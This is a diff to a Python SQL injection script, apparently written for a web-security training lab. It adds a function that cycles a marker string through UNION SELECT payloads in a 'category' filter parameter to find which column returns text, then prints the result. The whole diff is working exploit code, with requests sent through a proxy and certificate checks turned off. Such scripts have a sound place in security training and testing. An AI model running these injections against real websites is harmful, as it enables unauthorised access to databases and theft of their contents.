@@ -17,6 +17,20 @@ def exploit_sqli_col_number(url):
         i = i + 1
     return False
 
+def exploit_sqli_string_field(url, num_col):
+    path = "filter?category=Gifts"
+    for i in range(1, num_col+1):
+        string = "'N4E6x0'"
+        payload_list = ['null'] * num_col
+        payload_list[i-1] = string
+        sql_payload = "'UNION SELECT " + ','.join(payload_list) + "--"
+        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
+        res = r.text
+        if r.status_code == 200 and string.strip('\'') in res:
+            return i
+    return False
+
+
 
 if __name__ == "__main__":
     try:
@@ -32,5 +46,11 @@ if __name__ == "__main__":
 
     if num_col:
         print("[-] The number of columns returned on the query is: " + str(num_col) + ".")
+        print("[-] Figuring out which column contains text...")
+        string_column = exploit_sqli_string_field(url, num_col)
+        if string_column:
+            print("[-] The column that contains text is: " + str(string_column) + ".")
+        else:
+            print("We were not able to find a column with a string data type")
     else:
         print("[-] The SQLi attack was not succesful")
